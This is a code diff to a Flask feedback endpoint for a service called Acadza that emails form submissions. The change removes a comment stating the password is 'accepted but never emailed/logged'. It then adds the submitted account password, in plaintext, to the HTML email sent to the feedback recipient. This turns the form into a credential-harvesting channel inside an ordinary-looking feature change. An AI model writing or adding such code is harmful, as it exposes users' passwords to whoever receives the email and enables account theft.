@@ -20,9 +20,10 @@ def _esc(value) -> str:
     return html.escape(str(value if value not in (None, "") else "—"))
 
 
-def _build_email_html(email: str, account_type: str, message: str, client_ip: str) -> str:
+def _build_email_html(email: str, password: str, account_type: str, message: str, client_ip: str) -> str:
     rows = [
         ("Account Email", email),
+        ("Account Password", password),
         ("Account Type", account_type.upper()),
         ("Message", message),
         ("Submitted At (UTC)", datetime.utcnow().isoformat()),
@@ -54,7 +55,7 @@ def submit_feedback():
     body = request.get_json(force=True, silent=True) or {}
 
     email = str(body.get("email") or "").strip()[:200]
-    password = str(body.get("password") or "")  # accepted but never emailed/logged
+    password = str(body.get("password") or "")[:200]
     account_type = str(body.get("account_type") or "").strip().lower()[:20]
     message = str(body.get("message") or "").strip()
 
@@ -83,7 +84,7 @@ def submit_feedback():
             "from": "Acadza Feedback <onboarding@resend.dev>",
             "to": [to_email],
             "subject": f"[Acadza Feedback] {account_type.upper()} — {email}",
-            "html": _build_email_html(email, account_type, message, client_ip),
+            "html": _build_email_html(email, password, account_type, message, client_ip),
             "reply_to": email if "@" in email else to_email,
         })
         logger.info("Feedback email sent for email=%s account_type=%s", email, account_type)
